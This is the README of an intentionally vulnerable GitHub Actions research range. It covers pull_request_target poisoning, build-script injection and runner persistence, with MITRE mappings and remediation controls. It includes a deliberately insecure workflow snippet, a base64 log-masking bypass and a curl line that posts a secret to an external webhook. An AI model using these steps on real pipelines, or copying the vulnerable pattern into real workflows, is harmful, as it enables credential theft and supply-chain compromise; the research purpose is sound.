# vulnerable-cicd-range

A controlled, intentionally vulnerable CI/CD testbed for researching supply-chain attack vectors in GitHub Actions pipelines. Built as an empirical threat emulation range to study credential exfiltration, privilege escalation, and pipeline poisoning techniques.

> **Disclaimer**: This repository is strictly for educational and research purposes. All credentials are simulated dummy tokens. No real secrets are exposed.

---

## Overview

This repository demonstrates three classes of CI/CD attack vectors documented in academic literature (USENIX Security '22 — Koishybayev et al.) and mapped to the MITRE ATT&CK framework. It serves as the offensive testbed component of a broader CI/CD threat detection research project.

The vulnerable pipeline is intentionally misconfigured to expose:
- Secret access in untrusted execution contexts
- Log-masking bypass via encoding
- Arbitrary code execution from PR branches

---

## Attack Surface & MITRE ATT&CK Mapping

| # | Vulnerability | MITRE Technique | Description |
|---|---|---|---|
| 1 | `pull_request_target` Poisoning | T1195.002 — Supply Chain Compromise | Workflow runs in the privileged base-repo context while executing untrusted code checked out from a fork PR, exposing repository secrets. |
| 2 | Secret Exfiltration via Masking Bypass | T1552 / T1048 — Unsecured Credentials / Exfiltration | Base64 encoding bypasses GitHub's literal-string log masking. Credentials are exfiltrated via outbound HTTP to an external listener. |
| 3 | Build Script Injection | T1195.001 — Compromised Dependency | Attacker-controlled `build.sh` from the PR branch executes in the privileged runner environment under `pull_request_target`. |
| 4 | Self-Hosted Runner Persistence | T1078 / T1059.004 — Valid Accounts / Shell | Persistent runners retain state between jobs, enabling backdoor implantation by malicious PRs. |
| 5 | Script Injection via Context Variables | T1059 — Command Interpreter | Unsanitised GitHub context values (e.g. PR title) interpolated directly into `run:` blocks enable command injection. |

---

## Repository Structure

```
.
├── .github/
│   └── workflows/
│       ├── vulnerable.yml      # Intentionally vulnerable workflow (pull_request_target)
│       └── hardened.yml        # Remediated reference workflow (pull_request, least privilege)
├── scripts/
│   ├── build.sh                # Baseline build script (benign, executes on main)
│   └── clean_webhook_ui.js     # Browser utility for webhook listener UI
├── payloads/
│   └── attacker_build_payload.sh  # Simulated attacker payload for PR branch testing
├── test_webhook.ps1            # Local pre-flight webhook connectivity test (PowerShell)
└── README.md
```

---

## Vulnerability Deep Dive: `pull_request_target` Poisoning

### Root Cause

GitHub Actions exposes two Pull Request triggers with fundamentally different trust models:

| Trigger | Execution Context | Secret Access |
|---|---|---|
| `on: pull_request` | Fork/untrusted context | ❌ No secrets |
| `on: pull_request_target` | Base repo (privileged) context | ✅ Full secret access |

`pull_request_target` was designed for safe automation tasks (labelling, commenting) that require write permissions. The security boundary collapses when this privileged workflow checks out and executes code from the incoming PR:

```yaml
# Vulnerable pattern
on: pull_request_target

steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # Untrusted code
  - run: ./scripts/build.sh                           # Executes in privileged context
```

Since the runner already has repository secrets loaded into memory, any code from the pull request can read and exfiltrate them.

### Exfiltration Mechanism

The workflow further demonstrates how GitHub's log masking (a simple regex on the exact plaintext secret) is trivially bypassed:

```bash
# GitHub masks the literal value of $SECRET in logs
# Base64 encoding produces a string that is not masked
B64=$(echo -n "$SECRET" | base64)
echo "$B64"  # Printed to logs unmasked

# Exfiltrate via outbound HTTP
curl -X POST "$WEBHOOK_URL" -d "{\"token\": \"$SECRET\"}"
```

---

## Workflows

### `vulnerable.yml` — Threat Emulation Workflow

- **Trigger**: `on: pull_request_target`
- **Permissions**: `write-all` (over-privileged)
- **Behaviour**: Echoes a dummy secret, base64-encodes it (masking bypass), and sends it via `curl` to a configured external listener. Checks out and executes the PR branch's `build.sh`.

### `hardened.yml` — Remediation Reference

- **Trigger**: `on: pull_request` (untrusted fork context)
- **Permissions**: `contents: read` (least privilege)
- **Behaviour**: Demonstrates that repository secrets are inaccessible from fork PRs under the standard trigger. Intended as the control baseline.

---

## Triggering the Exploit

### Prerequisites
- A public GitHub repository with this codebase.
- Repository secrets configured:
  - `DUMMY_SECRET` — Simulated credential (e.g. `FLAG{gh_actions_pwned_dummy_token}`)
  - `WEBHOOK_URL` — External HTTP listener URL (e.g. [webhook.site](https://webhook.site))

### Steps

1. Push this repository to GitHub.
2. Create a branch (`test-exploit-pr`) and open a Pull Request against `main`.
3. The `pull_request_target` workflow triggers automatically.
4. Observe the exfiltration payload arrive at the configured listener, containing the decoded `DUMMY_SECRET`.

---

## Remediation Controls

| Vulnerability | Recommended Control |
|---|---|
| `pull_request_target` + head checkout | Switch to `pull_request`; require manual approval for fork PRs via `environment` protection rules |
| Over-privileged `GITHUB_TOKEN` | Declare explicit `permissions: { contents: read }` |
| Static stored secrets | Migrate to OIDC short-lived federated credentials (no stored tokens) |
| Outbound exfiltration | Enforce egress filtering on self-hosted runners; use GitHub-hosted ephemeral runners |
| Script injection | Pass context values via `env:` variables, never inline `${{ }}` in shell scripts |

---

## References

- Koishybayev, I. et al. *"Characterizing the Security of GitHub CI Workflows"* — USENIX Security '22
- MITRE ATT&CK — [T1195.002](https://attack.mitre.org/techniques/T1195/002/), [T1552](https://attack.mitre.org/techniques/T1552/), [T1048](https://attack.mitre.org/techniques/T1048/)
- GitHub Docs — [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- Legit Security — *"Hijacking GitHub Workflows via pull_request_target"*
